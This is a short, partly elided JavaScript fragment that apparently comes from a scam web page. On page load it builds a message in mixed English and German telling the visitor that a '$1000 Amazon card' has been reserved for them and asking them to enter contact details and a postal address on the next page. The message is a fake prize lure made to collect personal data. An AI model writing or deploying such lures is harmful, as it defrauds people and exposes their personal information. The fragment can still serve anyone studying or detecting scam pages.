...
(function () {
  ...
  function onDOMContentLoaded() {
    ...
    var takeitessage = '<div>Your <span class="marked">$1000 Amazon card</span> wurde von Amazon reserviert!</div><br><br>1. Geben Sie auf der nächsten Seite Ihre Kontaktdaten und Ihre Postanschrift ein.<br>2. Ihre Amazon-Karte wird innerhalb von 10-14 Werktagen versendet.</div>';
